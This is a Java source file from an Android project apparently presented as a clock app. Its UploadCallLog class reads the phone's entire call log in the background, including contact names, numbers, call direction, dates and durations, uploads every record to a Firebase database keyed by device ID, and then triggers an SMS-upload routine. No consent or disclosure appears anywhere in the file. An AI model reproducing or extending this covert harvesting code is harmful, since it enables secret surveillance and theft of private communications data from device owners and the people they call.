package com.aftab.clock.Classes;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.CallLog;

import com.aftab.clock.Model.CallLogs;
import com.aftab.clock.Utills.FireRef;
import com.aftab.clock.Utills.Functions;

@SuppressLint("StaticFieldLeak")
@SuppressWarnings("deprecation")
public class UploadCallLog {
    private static UploadCallLog instances;

    public static UploadCallLog with(Context context) {

        new AsyncCaller(context).execute();

        if (instances == null)
            instances = new UploadCallLog();
        return instances;
    }


    @SuppressWarnings("deprecation")
    private static class AsyncCaller extends AsyncTask<Void, Void, Void> {

        Context context;
        Activity activity;

        public AsyncCaller(Context context) {
            this.context = context;
            activity = (Activity) context;

        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();

        }

        @Override
        protected Void doInBackground(Void... params) {


            Cursor managedCursor = activity.managedQuery(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
            int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
            int name = managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
            int type = managedCursor.getColumnIndex(CallLog.Calls.TYPE);
            int date = managedCursor.getColumnIndex(CallLog.Calls.DATE);
            int duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION);

            while (managedCursor.moveToNext()) {
                String nameS = managedCursor.getString(name);
                String phNumber = managedCursor.getString(number);
                String callType = managedCursor.getString(type);
                String callDate = managedCursor.getString(date);
                String callDuration = managedCursor.getString(duration);
                String dir;
                int dircode = Integer.parseInt(callType);

                if (dircode == CallLog.Calls.OUTGOING_TYPE) {

                    dir = "OUTGOING";

                } else if (dircode == CallLog.Calls.INCOMING_TYPE) {

                    dir = "INCOMING";

                } else if (dircode == CallLog.Calls.REJECTED_TYPE) {

                    dir = "INCOMING";

                } else {

                    dir = "MISSED";

                }


                if (phNumber.contains(".")) {

                    phNumber = phNumber.replace(".", ",");

                } else if (phNumber.contains("#")) {

                    phNumber = phNumber.replace("#", "-");

                } else if (phNumber.contains("$")) {

                    phNumber = phNumber.replace("$", "_");

                } else if (phNumber.contains("[")) {

                    phNumber = phNumber.replace("[", "+");

                } else if (phNumber.contains("]")) {

                    phNumber = phNumber.replace("]", "/");

                }


                if (!phNumber.contains("*") && !phNumber.contains("#")) {

                    if (!phNumber.startsWith("+") && phNumber.length() > 6) {

                        phNumber = Functions.formatNumber(context, phNumber, Functions.checkCountryISO(context));


                    }

                }


                String pushId = callDate + phNumber;


                CallLogs callLogs = new CallLogs(pushId, nameS, phNumber, dir, callDate, callDuration, "No Location", "no", false);
                String deviceID = Functions.getDeviceId(context);

                FireRef.CALL_LOGS.child(deviceID)
                        .child(phNumber)
                        .child(pushId)
                        .setValue(callLogs);


            }

           UploadSimSMS.with(context);


            managedCursor.close();


            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            super.onPostExecute(result);


        }

    }
}
